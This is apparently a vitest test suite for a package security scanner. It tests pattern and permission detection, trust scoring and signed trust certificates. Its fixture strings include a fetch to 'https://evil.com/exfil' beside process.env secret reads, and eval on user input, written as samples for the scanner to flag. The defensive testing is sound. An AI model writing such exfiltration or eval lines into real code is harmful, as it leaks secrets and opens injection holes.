import { describe, it, expect, beforeEach } from 'vitest';
import { scan, scanCodePatterns, scanPermissions, computeTrustScore, issueSTC, verifySTC } from '../index.js';
import { InMemoryKeyProvider, publicKeyToDid } from '@sentinel-atl/core';
import { mkdtemp, writeFile, mkdir } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

// ─── Helpers ──────────────────────────────────────────────────────────

async function createTempPackage(files: Record<string, string>): Promise<string> {
  const dir = await mkdtemp(join(tmpdir(), 'sentinel-scan-'));
  for (const [name, content] of Object.entries(files)) {
    const filePath = join(dir, name);
    const dirPath = join(dir, name.split('/').slice(0, -1).join('/'));
    if (name.includes('/')) {
      await mkdir(dirPath, { recursive: true });
    }
    await writeFile(filePath, content, 'utf-8');
  }
  return dir;
}

async function makeIdentity(kp: InMemoryKeyProvider) {
  await kp.generate('test-key');
  const pubKey = await kp.getPublicKey('test-key');
  const did = publicKeyToDid(pubKey);
  return { keyId: 'test-key', did };
}

// ─── Pattern Scanner Tests ────────────────────────────────────────────

describe('scanCodePatterns', () => {
  it('detects eval() usage', async () => {
    const dir = await createTempPackage({
      'server.js': 'const result = eval(userInput);\nconsole.log(result);',
    });

    const result = await scanCodePatterns(dir, ['.js']);
    expect(result.findings.some(f => f.title.includes('eval-usage'))).toBe(true);
    expect(result.findings.find(f => f.title.includes('eval-usage'))?.severity).toBe('critical');
  });

  it('detects new Function()', async () => {
    const dir = await createTempPackage({
      'server.js': 'const fn = new Function("return 42");\nfn();',
    });

    const result = await scanCodePatterns(dir, ['.js']);
    expect(result.findings.some(f => f.title.includes('new-function'))).toBe(true);
  });

  it('detects fetch to external URLs', async () => {
    const dir = await createTempPackage({
      'server.ts': 'const data = await fetch("https://evil.com/api");\n',
    });

    const result = await scanCodePatterns(dir, ['.ts']);
    expect(result.findings.some(f => f.title.includes('fetch-external'))).toBe(true);
  });

  it('ignores comments', async () => {
    const dir = await createTempPackage({
      'server.js': '// eval("harmless comment")\nconsole.log("safe");',
    });

    const result = await scanCodePatterns(dir, ['.js']);
    expect(result.findings.filter(f => f.title.includes('eval-usage'))).toHaveLength(0);
  });

  it('reports clean code with no findings', async () => {
    const dir = await createTempPackage({
      'server.ts': 'export function handler() {\n  return { message: "hello" };\n}\n',
    });

    const result = await scanCodePatterns(dir, ['.ts']);
    expect(result.findings).toHaveLength(0);
    expect(result.totalFiles).toBe(1);
  });

  it('skips node_modules and dist', async () => {
    const dir = await createTempPackage({
      'src/index.ts': 'export const x = 1;\n',
      'node_modules/evil/index.js': 'eval("pwned");\n',
      'dist/index.js': 'eval("compiled");\n',
    });

    const result = await scanCodePatterns(dir, ['.ts', '.js']);
    expect(result.totalFiles).toBe(1);
    expect(result.findings).toHaveLength(0);
  });
});

// ─── Permission Scanner Tests ────────────────────────────────────────

describe('scanPermissions', () => {
  it('detects filesystem access', async () => {
    const dir = await createTempPackage({
      'server.ts': 'import { readFile } from "node:fs/promises";\nconst data = await readFile("config.json", "utf-8");\n',
    });

    const result = await scanPermissions(dir, ['.ts']);
    expect(result.kinds).toContain('filesystem');
  });

  it('detects network access', async () => {
    const dir = await createTempPackage({
      'server.ts': 'import http from "node:http";\nhttp.createServer();\n',
    });

    const result = await scanPermissions(dir, ['.ts']);
    expect(result.kinds).toContain('network');
  });

  it('detects child_process usage', async () => {
    const dir = await createTempPackage({
      'server.ts': 'import { exec } from "node:child_process";\nexec("ls -la");\n',
    });

    const result = await scanPermissions(dir, ['.ts']);
    expect(result.kinds).toContain('process');
  });

  it('detects environment variable access', async () => {
    const dir = await createTempPackage({
      'config.ts': 'const key = process.env["API_KEY"];\n',
    });

    const result = await scanPermissions(dir, ['.ts']);
    expect(result.kinds).toContain('environment');
  });

  it('reports no permissions for clean code', async () => {
    const dir = await createTempPackage({
      'server.ts': 'export function add(a: number, b: number) { return a + b; }\n',
    });

    const result = await scanPermissions(dir, ['.ts']);
    expect(result.kinds).toHaveLength(0);
  });
});

// ─── Full Scan Tests ──────────────────────────────────────────────────

describe('scan (full)', () => {
  it('produces a complete scan report', async () => {
    const dir = await createTempPackage({
      'package.json': JSON.stringify({ name: '@test/mcp-server', version: '1.0.0' }),
      'src/index.ts': 'export function handler() { return "ok"; }\n',
    });

    const report = await scan({ packagePath: dir, skipDependencies: true });

    expect(report.packageName).toBe('@test/mcp-server');
    expect(report.packageVersion).toBe('1.0.0');
    expect(report.scannerVersion).toBe('0.3.0');
    expect(report.trustScore.overall).toBeGreaterThanOrEqual(0);
    expect(report.trustScore.overall).toBeLessThanOrEqual(100);
    expect(report.trustScore.grade).toMatch(/^[A-F]$/);
    expect(report.durationMs).toBeGreaterThanOrEqual(0);
  });

  it('gives high score to clean packages', async () => {
    const dir = await createTempPackage({
      'package.json': JSON.stringify({ name: '@test/clean-server', version: '1.0.0' }),
      'src/handler.ts': 'export function handle(input: string) {\n  return input.toUpperCase();\n}\n',
    });

    const report = await scan({ packagePath: dir, skipDependencies: true });
    expect(report.trustScore.overall).toBeGreaterThanOrEqual(75);
    expect(report.trustScore.grade).toMatch(/^[AB]$/);
    expect(report.findings).toHaveLength(0);
  });

  it('gives low score to risky packages', async () => {
    const dir = await createTempPackage({
      'package.json': JSON.stringify({ name: '@test/risky-server', version: '1.0.0' }),
      'src/evil.ts': [
        'import { exec } from "node:child_process";',
        'const result = eval(userInput);',
        'const fn = new Function("return " + code);',
        'await fetch("https://evil.com/exfil");',
        'const key = process.env["SECRET"];',
      ].join('\n'),
    });

    const report = await scan({ packagePath: dir, skipDependencies: true });
    expect(report.trustScore.overall).toBeLessThan(60);
    expect(report.findings.length).toBeGreaterThan(0);
    expect(report.findings.some(f => f.severity === 'critical')).toBe(true);
  });
});

// ─── STC Tests ─────────────────────────────────────────────────────────

describe('SentinelTrustCertificate', () => {
  let kp: InMemoryKeyProvider;
  let identity: { keyId: string; did: string };

  beforeEach(async () => {
    kp = new InMemoryKeyProvider();
    identity = await makeIdentity(kp);
  });

  it('issues and verifies an STC', async () => {
    const dir = await createTempPackage({
      'package.json': JSON.stringify({ name: '@test/mcp-server', version: '1.0.0' }),
      'src/index.ts': 'export function handler() { return "ok"; }\n',
    });

    const report = await scan({ packagePath: dir, skipDependencies: true });

    const stc = await issueSTC(kp, {
      scanReport: report,
      codeHash: 'abc123def456',
      issuerDid: identity.did,
      issuerKeyId: identity.keyId,
      issuerName: 'test-scanner',
    });

    expect(stc['@context']).toBe('https://sentinel.trust/stc/v1');
    expect(stc.type).toBe('SentinelTrustCertificate');
    expect(stc.id).toMatch(/^stc:/);
    expect(stc.subject.packageName).toBe('@test/mcp-server');
    expect(stc.subject.codeHash).toBe('abc123def456');
    expect(stc.proof.type).toBe('Ed25519Signature2024');

    // Verify
    const result = await verifySTC(stc);
    expect(result.valid).toBe(true);
  });

  it('detects tampered certificates', async () => {
    const dir = await createTempPackage({
      'package.json': JSON.stringify({ name: '@test/mcp-server', version: '1.0.0' }),
      'src/index.ts': 'export const x = 1;\n',
    });

    const report = await scan({ packagePath: dir, skipDependencies: true });

    const stc = await issueSTC(kp, {
      scanReport: report,
      codeHash: 'abc123',
      issuerDid: identity.did,
      issuerKeyId: identity.keyId,
    });

    // Tamper with the score
    const tampered = { ...stc, trustScore: { ...stc.trustScore, overall: 100, grade: 'A' } };
    const result = await verifySTC(tampered);
    expect(result.valid).toBe(false);
    expect(result.error).toContain('Invalid certificate signature');
  });

  it('detects expired certificates', async () => {
    const dir = await createTempPackage({
      'package.json': JSON.stringify({ name: '@test/expired', version: '1.0.0' }),
      'src/index.ts': 'export const x = 1;\n',
    });

    const report = await scan({ packagePath: dir, skipDependencies: true });

    // Issue with 0 validity (already expired)
    const stc = await issueSTC(kp, {
      scanReport: report,
      codeHash: 'hash123',
      issuerDid: identity.did,
      issuerKeyId: identity.keyId,
      validityHours: -1, // Force expired
    });

    const result = await verifySTC(stc);
    expect(result.valid).toBe(false);
    expect(result.error).toContain('expired');
  });

  it('includes finding summary', async () => {
    const dir = await createTempPackage({
      'package.json': JSON.stringify({ name: '@test/risky', version: '1.0.0' }),
      'src/bad.ts': 'eval("dangerous");\n',
    });

    const report = await scan({ packagePath: dir, skipDependencies: true });

    const stc = await issueSTC(kp, {
      scanReport: report,
      codeHash: 'hash456',
      issuerDid: identity.did,
      issuerKeyId: identity.keyId,
    });

    expect(stc.findingSummary.total).toBeGreaterThan(0);
    expect(stc.findingSummary.critical).toBeGreaterThan(0);
  });
});
